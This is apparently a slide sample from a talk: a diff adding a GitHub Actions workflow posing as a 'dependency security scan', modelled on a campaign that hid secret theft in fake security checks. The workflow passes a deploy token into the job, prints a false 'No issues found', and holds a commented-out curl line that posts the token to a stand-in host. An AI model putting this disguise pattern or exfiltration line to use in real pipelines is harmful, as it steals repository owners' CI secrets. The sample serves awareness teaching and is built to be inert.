@@ -1,0 +1,27 @@
+# Slide 22 / Finding 2: "it looked exactly like safety, so nobody read it".
+# Modeled on the GhostAction campaign (workflows disguised as security checks).
+# INERT: manual trigger only, the host does not resolve, nothing is sent.
+name: Security Scan
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  scan:
+    name: "dependency security scan"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - name: Run scanner
+        env:
+          # The costume: it asks for every secret "to scan with".
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          echo "Scanning dependencies..."
+          # What the real ones did (commented out, and the host is .invalid):
+          # curl -s -X POST https://scan-results.example.invalid/upload -d "t=$DEPLOY_TOKEN"
+          echo "No issues found."
